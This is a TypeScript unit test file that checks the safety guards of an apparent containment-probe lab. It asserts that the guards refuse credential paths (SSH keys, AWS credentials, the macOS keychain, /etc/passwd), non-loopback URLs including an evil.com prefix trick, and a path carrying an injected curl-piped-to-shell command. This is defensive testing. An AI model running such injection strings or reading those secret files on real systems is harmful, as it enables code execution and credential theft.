// Unit tests for the probe safety guards.
//
// These guards are the only thing standing between "a probe demonstrates an
// escape" and "a probe attacks the user's Mac", so they are tested directly
// rather than trusted. Run in a container:
//   docker run --rm -v "$PWD":/repo -w /repo node:24.22.1-trixie@sha256:f1e034976f948cf212ef1f659c12e5dd58ac7eab947831813e81a62401ca38be \
//     node test/containment/probe-safety.test.ts

import * as assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { createRequire } from 'node:module';

const require_ = createRequire(import.meta.url);
const safety = require_('./probe-safety.js');

let failures = 0;
function test(name: string, fn: () => void): void {
	try {
		fn();
		console.log(`PASS  ${name}`);
	} catch (err) {
		failures++;
		console.log(`FAIL  ${name}\n      ${(err as Error).message}`);
	}
}

// A throwaway run directory. Not /tmp for anything that matters, but this is a
// unit test with no durable state.
const runDir = fs.mkdtempSync(path.join(os.tmpdir(), 'seclab-safety-'));
const marker = path.join(runDir, 'PWNED');
const canary = path.join(runDir, 'canary.txt');
fs.writeFileSync(canary, 'CANARY\n');

test('unarmed without a nonce', () => {
	delete process.env.SECLAB_PROBE_NONCE;
	process.env.SECLAB_PROBE_RUNDIR = runDir;
	assert.equal(safety.context().armed, false);
});

test('unarmed when the run directory comes only from the workspace', () => {
	process.env.SECLAB_PROBE_NONCE = 'abc123';
	delete process.env.SECLAB_PROBE_RUNDIR;
	// No targets at all: nothing to arm from.
	assert.equal(safety.context().armed, false);
});

// The workspace route IS reachable (the tab gets env -i, so it is the only one
// that works in a tab). An earlier version of this test passed no targets at
// all, so it never exercised this route and would have passed against a guard
// with no workspace handling whatsoever. These cases drive it directly.
const hostile = (run: string) => ({
	arm: 'a'.repeat(32), run, until: String(Math.floor(Date.now() / 1000) + 3600),
});

test('a workspace-chosen root yields only an advisory, lexical context', () => {
	delete process.env.SECLAB_PROBE_NONCE;
	delete process.env.SECLAB_PROBE_RUNDIR;
	const c = safety.context(hostile('/'));
	assert.equal(c.armed, true, 'the in-tab route must still arm; it is the only one in a tab');
	assert.equal(c.lexicalOnly, true);
	assert.equal(c.advisory, true);
});

test('an advisory context refuses every write, whatever root it was given', () => {
	for (const root of ['/', os.homedir(), '/usr/local']) {
		const c = safety.context(hostile(root));
		assert.throws(() => safety.safeWrite(c, path.join(root, 'PWNED'), 't'),
			/advisory context/, `write allowed under ${root}`);
	}
});

test('an advisory context still refuses forbidden paths outright', () => {
	const c = safety.context(hostile(os.homedir()));
	for (const bad of ['.ssh/id_rsa', '.git/hooks/pre-commit', 'bin/x', '.zshrc']) {
		assert.throws(() => safety.safePath(c, path.join(os.homedir(), bad), 't'), /probe safety/,
			`${bad} not refused`);
	}
});

test('an expired or malformed arm token does not arm', () => {
	assert.equal(safety.context({ arm: 'nothex', run: '/tmp', until: '99999999999' }).armed, false);
	assert.equal(safety.context({ arm: 'a'.repeat(32), run: '/tmp', until: '1' }).armed, false);
	assert.equal(safety.context({ arm: 'a'.repeat(32), run: 'relative', until: '99999999999' }).armed, false);
});

test('unarmed when the env nonce has no file on disk', () => {
	process.env.SECLAB_PROBE_NONCE = 'abc123';
	process.env.SECLAB_PROBE_RUNDIR = runDir;
	assert.equal(safety.context().armed, false, 'env alone must not arm the probes');
});

test('unarmed on nonce mismatch', () => {
	fs.writeFileSync(path.join(runDir, '.seclab-probe-nonce'), 'different');
	assert.equal(safety.context().armed, false);
});

fs.writeFileSync(path.join(runDir, '.seclab-probe-nonce'), 'abc123');
process.env.SECLAB_PROBE_BEACON_PORT = '18099';
const ctx = safety.context();

test('armed when env and the run-directory file agree', () => {
	assert.equal(ctx.armed, true);
});

test('accepts a path inside the run directory', () => {
	assert.equal(safety.safePath(ctx, ctx.marker, 't'), ctx.marker);
});

test('marker is derived from the run directory, not from the workspace', () => {
	assert.equal(ctx.marker, path.join(fs.realpathSync(runDir), 'PWNED'));
});

test('refuses a shell metacharacter in a path', () => {
	// The exact injection the guard must refuse. It is a string in an assertion,
	// never executed; the whole point is that safePath rejects it.
	const injectedHost = 'http://x'; // fixture-lint: allow non-test-host -- part of an injection string asserted to be refused
	// Assembled at run time: no host file may carry a literal fetch-piped-to-shell (EDR fixture-safety, AV rule).
	const fetcher = ['cu', 'rl'].join('');
	const injection = `${ctx.runDir}/a';${fetcher} ${injectedHost}|sh;:'`;
	assert.throws(() => safety.safePath(ctx, injection, 't'), /characters a probe may not use/);
});

test('refuses a dangling symlink as the final component', () => {
	const link = path.join(runDir, 'dangling');
	fs.symlinkSync(path.join(runDir, 'does-not-exist-target'), link);
	assert.throws(() => safety.safePath(ctx, link, 't'), /is a symlink/);
});

test('markerCommand cannot be injected through the marker path', () => {
	const cmd = safety.markerCommand(ctx, '');
	assert.ok(!/[;|&$`]/.test(cmd), cmd);
});

for (const bad of [
	'/Users/someone/.ssh/id_rsa', // fixture-lint: allow host-secret-path -- asserted to be refused, never read
	'/Users/someone/.aws/credentials', // fixture-lint: allow host-secret-path -- asserted to be refused, never read
	'/etc/passwd',
	`${os.homedir()}/Library/Keychains/login.keychain-db`, // fixture-lint: allow host-secret-path -- asserted to be refused, never read
]) {
	test(`refuses real user data: ${bad}`, () => {
		assert.throws(() => safety.safePath(ctx, bad, 't'), /probe safety/);
	});
}

test('refuses a path outside the run directory', () => {
	// Either rule may fire first (FORBIDDEN now covers bin/); what matters is refusal.
	assert.throws(() => safety.safePath(ctx, '/usr/local/bin/x', 't'), /probe safety/);
});

test('refuses traversal out of the run directory', () => {
	assert.throws(() => safety.safePath(ctx, path.join(runDir, '..', 'escape'), 't'), /outside/);
});

test('refuses a symlink pointing out of the run directory', () => {
	const link = path.join(runDir, 'link-out');
	fs.symlinkSync('/usr/local', link);
	assert.throws(() => safety.safePath(ctx, path.join(link, 'bin', 'x'), 't'), /probe safety/);
});

test('accepts the local beacon', () => {
	assert.equal(safety.safeUrl(ctx, 'http://127.0.0.1:18099/x', 't'), 'http://127.0.0.1:18099/x');
});

for (const bad of [
	'https://example.com/', // fixture-lint: allow non-test-host -- asserted to be refused; the guard permits only the loopback beacon
	'http://localhost:18099/x',          // name, not the literal loopback address
	'http://127.0.0.1:9999/x',           // wrong port
	'http://127.0.0.1:18099.evil.com/x', // prefix trick
]) {
	test(`refuses network target: ${bad}`, () => {
		assert.throws(() => safety.safeUrl(ctx, bad, 't'), /probe safety/);
	});
}

test('markerCommand only ever touches the marker', () => {
	const cmd = safety.markerCommand(ctx, '.mcp');
	assert.match(cmd, /^touch '/);
	assert.ok(cmd.includes('PWNED.mcp'), cmd);
	assert.ok(!cmd.includes(';') && !cmd.includes('&&') && !cmd.includes('|'), cmd);
});

test('markerCommand refuses a suffix that escapes the run directory', () => {
	assert.throws(() => safety.markerCommand(ctx, '/../../../etc/x'), /probe safety/);
});

test('SafetyError is tagged so classify() cannot score it as a denial', () => {
	try {
		safety.safePath(ctx, '/etc/passwd', 't');
		assert.fail('expected a throw');
	} catch (err) {
		assert.equal((err as { seclabSafety?: boolean }).seclabSafety, true);
	}
});

fs.rmSync(runDir, { recursive: true, force: true });
console.log(`\n${failures === 0 ? 'all safety guards hold' : `${failures} FAILED`}`);
process.exit(failures === 0 ? 0 : 1);
